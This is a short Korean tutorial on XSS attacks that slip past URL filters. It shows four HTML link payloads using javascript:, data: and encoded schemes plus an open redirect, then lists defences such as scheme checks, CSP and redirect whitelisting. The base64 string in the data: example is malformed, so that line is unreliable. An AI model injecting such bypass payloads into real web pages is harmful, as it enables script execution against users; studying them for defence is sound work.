# URL 스크립트 우회 공격 예시

## 1. 개요
URL 스크립트 우회 공격(URL Script Bypass Attack)은 웹 애플리케이션에서 특정 URL 필터링을 우회하여 악성 스크립트를 실행하는 공격 방법입니다.

## 2. 공격 예시

### 📌 예제 1: JavaScript 프로토콜을 이용한 공격
```html
<a href="javascript:alert('XSS 공격!')">클릭하세요</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIEdv!')<L3NjcmlwdD4=">여기를 클릭하세요</a>
<a href="javascript%3Aalert%281%29">클릭하면 alert(1) 실행</a>
<a href="https://example.com/redirect?url=javascript:alert('XSS')">보안이 취약한 리디렉션 링크</a>
```
방어 방법
URL 스킴 검증: javascript: 또는 data: 스킴을 차단.
CSP(Content Security Policy) 적용: 허용되지 않은 스크립트 실행 차단.
입력값 필터링: URL 인코딩을 검출하고 차단.
Open Redirect 방지: 리디렉션 대상 URL을 화이트리스트 방식으로 제한.
🚨 주의: 위 예제는 학습 목적으로만 제공되며, 실제 공격에 사용해서는 안 됩니다!
